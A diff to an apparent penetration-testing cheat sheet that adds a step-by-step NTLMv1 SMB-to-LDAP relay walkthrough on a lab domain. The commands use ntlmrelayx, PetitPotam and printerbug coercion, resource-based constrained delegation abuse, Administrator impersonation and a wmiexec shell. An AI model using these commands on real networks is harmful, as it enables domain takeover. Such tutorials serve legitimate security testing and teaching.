@@ -856,7 +856,56 @@ python3 ntlmv1.py --ntlmv1 'DC01$::RANGE:B8154B285809096F4AA9D8285846C401CDE8D2F
 4. Submit hash to https://crack.sh/get-cracking and wait for the result (should be retrieved via email within seconds)
 
 ### Relay SMB to LDAP
-KIV. Can refer to this [link](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
+This is only possible if **NTLMv1 is enabled** but you will need to specify `--remove-mic` flag when firing up _ntlmrelayx.py_ to set `NTLMSSP_NEGOTIATE_SIGN` flag to false. Read details explanation [here](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
+> Relaying from SMB to the LDAP service is quite straightforward and simply requires an attacker to specify the –remove-mic flag when performing a relaying attack. Originally, this flag was added to support exploitation of the “Drop the MIC” vulnerability. However, it also has the benefit of setting the NTLMSSP_NEGOTIATE_SIGN flag to false. This allows relaying from SMB to the LDAP service to work since NTLMv1 doesn’t include a message integrity code (MIC).
+
+1. First step is optional and 
+```
+# open socks session with ntlmrelayx.py to store SMB session on ws01 as dc01
+ntlmrelayx.py -t ws01.range.net -smb2support -socks
+
+# coerce authentication with PetitPotam.py
+python3 PetitPotam.py 192.168.86.193(attacker) dc01.range.net
+```
+2. Now you should have socks SMB session on ws01$ as dc01$. Execute ntlmrelayx.py `stopservers` command to stop other listening ports as we no longer need them.
+3. Fire up `ntlmrelayx.py` with `--remove-mic` flag targeting ldap service on dc01. _Note that the -i flag is to open an interactive ldap session_
+```
+ntlmrelayx.py -t ldap://dc01.range.net -smb2support --remove-mic -i
+```
+4. Use printerbug.py script to coerce spooler service as WS01$. _You can either use either a plain-text password, kerberos auth or socks session opened earlier in step1_
+```
+# password auth
+python3 printerbug.py range.net/rangeadm:Password123@ws01.range.net "192.168.86.193" -no-ping -no-pass
+
+# ntlmrelayx.py socks session
+proxychains python3 printerbug.py RANGE/DC01\$@ws01.range.net "192.168.86.193" -no-ping -no-pass
+```
+5. Now ntlmrelayx.py should be showing a successful relaying attempt to ldap service like the following
+```
+[[..snip..]]
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.86.184, attacking target ldap://dc01.range.net
+[*] Authenticating against ldap://dc01.range.net as RANGE/WS01$ SUCCEED
+[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
+[[..snip..]]
+```
+6. You can interact with the LDAP interactive shell by using `nc` or `telnet` to port 11000 (default)
+7. In this scenario, we can abuse so many ldap feature. One of the infamous POC is abusing RBCD. Lets first create a controlled computer account using `addcomputer.py` impacket script.
+```
+addcomputer.py range.net/lowpriv:Password1234 -computer-name evilpc -computer-pass Password1234
+```
+8. Use the LDAP shell _set_rbcd_  to set WS01$ `msds-allowedtoactonbehalfofotheridentity` to our controlled computer evilpc$
+9. Make s4u request to get a service ticket as the impersonated account
+```
+getST.py range.net/lowpc2\$:Password123 -spn http/ws01.range.net -impersonate Administrator -dc-ip 192.168.86.182
+```
+10. Now try wmiexec into WS01$ and win
+```
+wmiexec.py range.net/Administrator@ws01.range.net -no-pass -k
+```
+
+### References
+* https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
+- https://twitter.com/an0n_r0/status/1571598587439775745?s=20&t=q3-YgJ7LcZATARKd0JnlKQ
 
 # PrintNightmare
 Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
